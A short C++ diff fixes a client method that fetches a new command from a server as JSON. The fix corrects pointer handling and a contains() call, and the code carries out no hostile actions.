@@ -145,17 +145,21 @@ public:
         We send on payload to the server in this case. 
         We only expect a response payload from the server. 
         */
-        bool res = send_request_safe(CHECK_NEW_CMD_URI, NULL, &cmd);
-        json cmd_current = *cmd;
+       json cmd_current;
+        bool res = send_request_safe(CHECK_NEW_CMD_URI, NULL, &cmd_current);
         if (res)
         {
-            if(cmd_current.contains["status"] && cmd_current["status"] == "error")
+            if(cmd_current.contains("status") && cmd_current["status"] == "error")
             {
                 std::cout << "Failed fetching new command: " << cmd_current["message"] << std::endl;
                 return false;
             }
+
+            *cmd = cmd_current;
+            
             return true;
         }
+        
         std::cout << "Failed fetching new command due to server error" << std::endl;
         return false;
     }
